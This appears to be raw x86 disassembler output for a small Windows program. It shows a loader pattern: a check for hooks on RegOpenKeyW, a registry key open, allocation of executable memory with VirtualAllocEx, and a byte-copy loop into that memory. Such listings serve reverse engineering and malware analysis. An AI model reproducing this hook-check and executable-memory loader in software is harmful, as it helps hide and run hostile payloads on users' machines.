0x00401000:	pushl	%ebp	; from: 0x0040162d(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	pushl	%ecx
0x00401004:	movl	$0x4, -4(%ebp)
0x0040100b:	movl	-4(%ebp), %eax
0x0040100e:	addl	$0x40e61c, %eax
0x00401013:	movl	%eax, 0x0042d27c
0x00401018:	movl	%ebp, %esp
0x0040101a:	popl	%ebp
0x0040101b:	ret	; targets: 0x00401632(MAY)

0x00401040:	pushl	%ebp	; from: 0x00401726(MAY)
0x00401041:	movl	%esp, %ebp
0x00401043:	subl	$0xc, %esp
0x00401046:	movl	0x8(%ebp), %eax
0x00401049:	movl	%eax, -8(%ebp)
0x0040104c:	movl	0xc(%ebp), %ecx
0x0040104f:	movl	%ecx, -12(%ebp)
0x00401052:	movl	$0x22b, -4(%ebp)
0x00401059:	movl	-8(%ebp), %edx
0x0040105c:	cmpl	-12(%ebp), %edx
0x0040105f:	jae	0x0040106f	; targets: 0x00401061(MAY)
0x00401061:	movl	$0x22b, -4(%ebp)	; from: 0x0040105f(MAY)
0x00401068:	movl	-8(%ebp), %eax
0x0040106b:	jmp	0x00401079	; targets: 0x00401079(MAY)
0x00401079:	movl	%ebp, %esp	; from: 0x0040106b(MAY)
0x0040107b:	popl	%ebp
0x0040107c:	ret	; targets: 0x0040172b(MAY)

0x00401080:	pushl	%ebp	; from: 0x004016db(MAY)
0x00401081:	movl	%esp, %ebp
0x00401083:	subl	$0xc, %esp
0x00401086:	movl	$0x1e4dc, -8(%ebp)
0x0040108d:	movl	$0x3000, -12(%ebp)
0x00401094:	movl	$0x40, -4(%ebp)
0x0040109b:	movl	-4(%ebp), %eax
0x0040109e:	pushl	%eax
0x0040109f:	movl	-12(%ebp), %ecx
0x004010a2:	pushl	%ecx
0x004010a3:	movl	0x8(%ebp), %edx
0x004010a6:	pushl	%edx
0x004010a7:	pushl	$0x0
0x004010a9:	pushl	$0xffffffff
0x004010ab:	call	VirtualAllocEx@kernel32.dll	; targets: 0xff0000b0(MAY)
0x004010b1:	movl	%ebp, %esp
0x004010b3:	popl	%ebp
0x004010b4:	ret	; targets: 0x004016e0(MAY)

0x004010c0:	pushl	%ebp	; from: 0x004016f9(MAY)
0x004010c1:	movl	%esp, %ebp
0x004010c3:	popl	%ebp
0x004010c4:	ret	; targets: 0x004016fe(MAY)

0x004010d0:	pushl	%ebp	; from: 0x004016c6(MAY)
0x004010d1:	movl	%esp, %ebp
0x004010d3:	movl	0x8(%ebp), %eax
0x004010d6:	movl	-4(%eax), %eax
0x004010d9:	popl	%ebp
0x004010da:	ret	; targets: 0x004016cb(MAY)

0x00401360:	pushl	%ebp	; from: 0x00401751(MAY)
0x00401361:	movl	%esp, %ebp
0x00401363:	subl	$0x22c, %esp
0x00401369:	movl	$0x7c, -544(%ebp)
0x00401373:	movl	$0x0, -532(%ebp)
0x0040137d:	movl	$0x0, -552(%ebp)
0x00401387:	jmp	0x00401398	; targets: 0x00401398(MAY)
0x00401389:	movl	-552(%ebp), %eax	; from: 0x004013da(MAY)
0x0040138f:	addl	$0x1, %eax
0x00401392:	movl	%eax, -552(%ebp)
0x00401398:	movl	-552(%ebp), %ecx	; from: 0x00401387(MAY)
0x0040139e:	cmpl	0x10(%ebp), %ecx
0x004013a1:	jnl	0x004013dc	; targets: 0x004013a3(MAY), 0x004013dc(MAY)
0x004013a3:	movl	0xc(%ebp), %edx	; from: 0x004013a1(MAY)
0x004013a6:	addl	-552(%ebp), %edx
0x004013ac:	movzbl	(%edx), %eax
0x004013af:	movl	%eax, -556(%ebp)
0x004013b5:	movl	$0x7c, -544(%ebp)
0x004013bf:	movl	0x8(%ebp), %ecx
0x004013c2:	addl	-552(%ebp), %ecx
0x004013c8:	movb	-556(%ebp), %dl
0x004013ce:	movb	%dl, (%ecx)
0x004013d0:	movl	$0x33, -544(%ebp)
0x004013da:	jmp	0x00401389	; targets: 0x00401389(MAY)
0x004013dc:	movl	%ebp, %esp	; from: 0x004013a1(MAY)
0x004013de:	popl	%ebp
0x004013df:	ret	; targets: unresolved


start:
0x00401580:	pushl	%ebp	; from: 0x00401628(MAY)
0x00401581:	movl	%esp, %ebp
0x00401583:	subl	$0xcc, %esp
0x00401589:	pushl	%ebx
0x0040158a:	pushl	%esi
0x0040158b:	pushl	%edi
0x0040158c:	movl	%ebp, 0x0042d390
0x00401592:	pusha	
0x00401593:	movl	$0x0, -136(%ebp)
0x0040159d:	movl	$0x80000002, -156(%ebp)
0x004015a7:	movl	RegOpenKeyW@advapi32.dll, %eax
0x004015ac:	movl	%eax, -180(%ebp)
0x004015b2:	movl	RegOpenKeyW@advapi32.dll, %ecx
0x004015b8:	movl	%ecx, -184(%ebp)
0x004015be:	movl	$0x42d030, -172(%ebp)
0x004015c8:	movl	-184(%ebp), %edx
0x004015ce:	movzbl	(%edx), %eax
0x004015d1:	cmpl	$0x8b, %eax
0x004015d6:	je	0x004015ed	; targets: 0x004015d8(MAY), 0x004015ed(MAY)
0x004015d8:	movl	-184(%ebp), %ecx	; from: 0x004015d6(MAY)
0x004015de:	movzbl	(%ecx), %edx
0x004015e1:	cmpl	$0x55, %edx
0x004015e4:	je	0x004015ed	; targets: 0x004015e6(MAY), 0x004015ed(MAY)
0x004015e6:	xorl	%eax, %eax	; from: 0x004015e4(MAY)
0x004015e8:	jmp	0x004018ff	; targets: 0x004018ff(MAY)
0x004015ed:	movl	$0x53, %eax	; from: 0x004015d6(MAY), 0x004015e4(MAY)
0x004015f2:	movl	-172(%ebp), %ecx
0x004015f8:	movw	%ax, 0x4(%ecx)
0x004015fc:	movl	$0x49, %edx
0x00401601:	movl	-172(%ebp), %eax
0x00401607:	movw	%dx, 0x6(%eax)
0x0040160b:	leal	-176(%ebp), %ecx
0x00401611:	pushl	%ecx
0x00401612:	movl	-172(%ebp), %edx
0x00401618:	pushl	%edx
0x00401619:	pushl	$0x80000000
0x0040161e:	call	-180(%ebp)	; targets: 0xff000070(MAY)
0x00401624:	testl	%eax, %eax
0x00401626:	je	0x0040162d	; targets: 0x0040162d(MAY), 0x00401628(MAY)
0x00401628:	call	start	; targets: 0x00401580(MAY)	; from: 0x00401626(MAY)
0x0040162d:	call	0x00401000	; targets: 0x00401000(MAY)	; from: 0x00401626(MAY), 0x00401905(MAY)
0x00401632:	movl	$0x64, -124(%ebp)	; from: 0x0040101b(MAY)
0x00401639:	movl	$0x28, -24(%ebp)
0x00401640:	movl	$0x0, -136(%ebp)
0x0040164a:	movl	$0x0, -80(%ebp)
0x00401651:	movl	$0x1, -120(%ebp)
0x00401658:	movl	$0x0, -16(%ebp)
0x0040165f:	movl	$0x64, -124(%ebp)
0x00401666:	movl	$0x28, -24(%ebp)
0x0040166d:	movl	$0x0, -136(%ebp)
0x00401677:	movl	$0x0, -80(%ebp)
0x0040167e:	movl	$0x1, -120(%ebp)
0x00401685:	movl	$0x3, -20(%ebp)
0x0040168c:	movl	$0x0, -16(%ebp)
0x00401693:	movl	$0x64, -124(%ebp)
0x0040169a:	movl	$0x28, -24(%ebp)
0x004016a1:	movl	$0x0, -136(%ebp)
0x004016ab:	movl	$0x0, -80(%ebp)
0x004016b2:	movl	$0x1, -120(%ebp)
0x004016b9:	movl	$0x3, -20(%ebp)
0x004016c0:	movl	0x0042d27c, %eax
0x004016c5:	pushl	%eax
0x004016c6:	call	0x004010d0	; targets: 0x004010d0(MAY)
0x004016cb:	addl	$0x4, %esp	; from: 0x004010da(MAY)
0x004016ce:	movl	%eax, -140(%ebp)
0x004016d4:	movl	-140(%ebp), %ecx
0x004016da:	pushl	%ecx
0x004016db:	call	0x00401080	; targets: 0x00401080(MAY)
0x004016e0:	addl	$0x4, %esp	; from: 0x004010b4(MAY)
0x004016e3:	movl	%eax, -132(%ebp)
0x004016e9:	movl	-140(%ebp), %edx
0x004016ef:	pushl	%edx
0x004016f0:	pushl	$0x0
0x004016f2:	movl	-132(%ebp), %eax
0x004016f8:	pushl	%eax
0x004016f9:	call	0x004010c0	; targets: 0x004010c0(MAY)
0x004016fe:	addl	$0xc, %esp	; from: 0x004010c4(MAY)
0x00401701:	movl	-140(%ebp), %ecx
0x00401707:	movl	%ecx, -148(%ebp)
0x0040170d:	movl	-136(%ebp), %edx
0x00401713:	cmpl	-140(%ebp), %edx
0x00401719:	jae	0x00401788	; targets: 0x0040171b(MAY)
0x0040171b:	movl	-148(%ebp), %eax	; from: 0x00401719(MAY)
0x00401721:	pushl	%eax
0x00401722:	movl	-124(%ebp), %ecx
0x00401725:	pushl	%ecx
0x00401726:	call	0x00401040	; targets: 0x00401040(MAY)
0x0040172b:	addl	$0x8, %esp	; from: 0x0040107c(MAY)
0x0040172e:	movl	%eax, -152(%ebp)
0x00401734:	movl	-152(%ebp), %edx
0x0040173a:	pushl	%edx
0x0040173b:	movl	0x0042d27c, %eax
0x00401740:	addl	-80(%ebp), %eax
0x00401743:	pushl	%eax
0x00401744:	movl	-132(%ebp), %ecx
0x0040174a:	addl	-136(%ebp), %ecx
0x00401750:	pushl	%ecx
0x00401751:	call	0x00401360	; targets: 0x00401360(MAY)
0x004018ff:	popl	%edi	; from: 0x004015e8(MAY)
0x00401900:	popl	%esi
0x00401901:	popl	%ebx
0x00401902:	movl	%ebp, %esp
0x00401904:	popl	%ebp
0x00401905:	ret	; targets: 0xfee70000(MAY), 0x0040162d(MAY)

